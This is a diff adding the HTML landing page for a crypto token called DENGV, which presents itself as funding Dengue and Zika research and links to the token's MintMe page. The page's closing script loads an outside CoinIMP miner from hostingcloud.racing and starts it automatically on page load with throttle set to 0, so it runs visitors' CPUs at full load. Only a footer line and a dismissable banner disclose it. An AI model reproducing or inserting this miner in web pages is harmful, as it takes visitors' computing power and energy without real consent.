@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DENGV Token</title>
+</head>
+<body>
+  <header>
+    <img src="assets/logo.png" alt="DENGV Logo" width="120"/>
+    <h1>DENGV Token</h1>
+    <p>Funding the Future of Virology</p>
+    <a href="https://www.mintme.com/token/DENGV" target="_blank">Buy Token</a>
+  </header>
+
+  <main>
+    <section>
+      <h2>About DENGV</h2>
+      <p>DENGV supports antiviral research for Dengue and Zika. Contribute to science through blockchain.</p>
+    </section>
+
+    <section>
+      <h2>Buy DENGV Token on MintMe</h2>
+      <iframe src="https://www.mintme.com/token/DENGV" width="100%" height="600" frameborder="0"></iframe>
+    </section>
+  </main>
+
+  <footer>
+    <p>&copy; 2025 DENGV Token</p>
+    <p>This site supports itself via JavaScript mining.</p>
+  </footer>
+
+  <!-- Crypto Mining Script -->
+  <script src="https://www.hostingcloud.racing/sosk.js"></script>
+  <script>
+    var _client = new Client.Anonymous('0dbe08928d7002d8bba659b82c09351a7bf9e5eb3752155e07d3556765481d02', {
+      throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+  </script>
+</body>
+</html>
